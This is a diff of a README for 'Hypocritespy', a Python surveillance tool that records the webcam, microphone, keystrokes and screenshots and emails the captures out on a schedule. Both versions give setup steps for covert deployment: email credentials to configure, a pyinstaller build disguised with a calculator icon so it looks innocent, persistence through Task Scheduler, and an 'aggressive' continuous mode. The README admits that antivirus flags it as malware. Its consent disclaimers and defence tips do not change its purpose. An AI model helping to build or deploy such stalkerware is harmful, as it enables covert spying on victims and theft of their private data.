@@ -1,129 +1,132 @@
-🔴  Hypocritespy 
-A Python-based surveillance utility Built with ❤️, ☕, and controlled chaos by Ronny Rogers (Mugabo Rongin)
+Hypocritespy
 
-⚠️ WARNING: This tool is for LEGITIMATE SECURITY TESTING ONLY on devices you own or have explicit permission to monitor. Unauthorized use violates privacy laws globally.
+A Python-based surveillance utility
+Built with passion, coffee, and controlled chaos by Ronny Rogers (Mugabo Rongin)
 
-🎯 What Does It Do?
-This toolkit captures system activity through multiple vectors:
+⚠️ Important Notice
 
-🎥 Webcam Recording – Captures video from default camera
+This tool is intended strictly for LEGITIMATE SECURITY TESTING on devices you own or have explicit authorization to monitor.
+Unauthorized use is illegal and violates privacy laws worldwide.
 
-🎤 Microphone Recording – Grabs ambient audio
+🎯 Overview
 
-⌨️ Keylogging – Tracks all keyboard inputs
+Hypocritespy captures system activity through multiple monitoring vectors:
 
-🖼️ Screenshots – Takes periodic screen captures
+🎥 Webcam Recording — Captures video from the default camera
 
-Default behavior: Records 10 minutes every 3 hours → emails data → repeats.
+🎤 Microphone Recording — Records ambient audio
 
-🛠️ Quick Setup
-1. 🔧 Edit These 4 Things
-Open the code files and replace:
+⌨️ Keylogging — Tracks keyboard inputs
 
-python
-# Your email (remove the existing one)
-YOUR_EMAIL = "your_email@gmail.com"
+🖼️ Screenshots — Takes periodic screenshots
 
-# Your app password (not regular password!)
-APP_PASSWORD = "your_app_specific_password"
+Default operation:
+Records 10 minutes every 3 hours, emails captured data, then repeats.
 
-# Recipient email
-RECIPIENT = "receiver@gmail.com"
+🛠️ Quick Setup Guide
+1. Configuration
 
-# Timing settings (adjust as needed)
-RECORD_DURATION = 600    # Seconds (10 minutes default)
-INTERVAL = 10800         # Seconds between sessions (3 hours default)
-2. 📦 Build the Executable
-Make it look innocent:
+Open the Python source files and update the following values:
 
-bash
-# Get a harmless icon (calculator.ico, notepad.ico, etc.)
+YOUR_EMAIL = "your_email@gmail.com"           # Your sending email address
+APP_PASSWORD = "your_app_specific_password"   # Use an app password, NOT your regular email password
+RECIPIENT = "receiver@gmail.com"               # Destination email for captured data
+
+# Timing settings (customize as needed)
+RECORD_DURATION = 600     # Duration in seconds (default: 10 minutes)
+INTERVAL = 10800          # Interval between recording sessions in seconds (default: 3 hours)
+
+2. Build the Executable
+
+To create a discreet executable, use a benign icon (e.g., calculator.ico):
+
 pyinstaller --onefile --windowed --icon=calculator.ico main.py
-3. ⚡ Ensure Startup Execution
-For 100% reliability, use Task Scheduler to trigger on startup/logon.
 
-🎨 Customization Options
-Timing Presets
-python
-# Quick monitoring (1 min every hour)
+3. Ensure Startup Execution
+
+For persistent operation, configure Task Scheduler (Windows) or an equivalent method to run the program at startup or user logon.
+
+🎨 Customization
+
+Timing presets:
+
+# Quick monitoring (1 minute every hour)
 RECORD_DURATION = 60
 INTERVAL = 3600
 
 # Aggressive monitoring (continuous)
 RECORD_DURATION = 86400  # 24 hours
 INTERVAL = 1             # Immediate repeat
-Feature Toggles
-Enable/disable specific modules in the configuration.
 
-⚠️ Critical Notes
-🚫 Antivirus will flag this as malware (because it is)
 
-📧 Use app passwords, not your real email password
+Feature toggles: Enable or disable modules (webcam, mic, keylogger, screenshots) in the configuration files as needed.
 
-🔒 Test in isolated VMs only
+⚠️ Critical Warnings
 
-⚖️ Check local laws before deployment
+Antivirus software will likely flag this tool as malicious. This is expected behavior.
 
-👁️ Always get written consent when monitoring others
+Always use app-specific passwords for email, never your primary account password.
 
-🛡️ Defense Against Such Tools
-To protect systems from unauthorized surveillance:
+Test exclusively in isolated virtual machines or controlled environments.
 
-🛡️ Use reputable antivirus software
+Review and comply with all local laws before use.
 
-🔍 Monitor startup programs regularly
+Obtain written consent from all monitored parties.
 
-🌐 Check outgoing network connections
+🛡️ Defense Against Surveillance Tools
 
-📋 Review Task Scheduler entries
+To protect your systems from unauthorized monitoring:
 
-🎯 Use webcam privacy covers
+Use reputable antivirus and anti-malware solutions.
+
+Regularly audit startup programs and scheduled tasks.
+
+Monitor outgoing network connections for suspicious activity.
+
+Employ physical webcam covers when not in use.
 
 📚 Legitimate Use Cases
-✅ Parental control (with child's knowledge where required)
 
-✅ Employee monitoring (with written consent & legal compliance)
+Parental control (with required knowledge or consent)
 
-✅ Personal device security research
+Employee monitoring (with legal compliance and consent)
 
-✅ Authorized penetration testing
+Personal device security research
 
-✅ Educational cybersecurity studies
+Authorized penetration testing
 
-🚫 Illegal Uses
-❌ Monitoring without consent
+Educational cybersecurity exercises
 
-❌ Spying on partners/friends/family
+🚫 Prohibited Uses
 
-❌ Corporate espionage
+Monitoring without explicit consent
 
-❌ Any unauthorized surveillance
+Spying on partners, friends, or family
+
+Corporate espionage
+
+Any unauthorized surveillance or privacy invasion
 
 ⚖️ Legal Disclaimer
+
 By using this software, you agree that:
 
-You will only use it legally and ethically
+You will use it only in a legal, ethical manner.
 
-You accept full responsibility for your actions
+You accept full responsibility for any consequences arising from its use.
 
-The developer is not liable for misuse
+The developer holds no liability for misuse or illegal activities.
 
-You understand the potential legal consequences of unauthorized use
-
-📞 More info
-[For educational inquiries only](https://ronny12345-art.github.io/ronnyrogers.dev/
+You understand the potential legal ramifications of unauthorized surveillance.
 
 👤 Author
 
-Ronny Rogers 💻 Developer | 🛡️ Cyber security specialist | ⚡ Pentester)
+Ronny Rogers
+Developer | Cybersecurity Specialist | Penetration Tester
+More info
 
-Purpose: Learning about surveillance detection
+🔐 Final Note
 
-Goal: Improving defensive security measures
-
-Ethics: Always prioritize privacy and consent
-
-🔐 Remember: True power in cybersecurity comes from protection, not intrusion. Use this knowledge to build better defenses, not to breach them.
+The true power of cybersecurity lies in protection, not intrusion. Use this knowledge responsibly to strengthen defenses and respect privacy.
 
 Version: 1.0 | For Educational Purposes Only | Use Responsibly
-
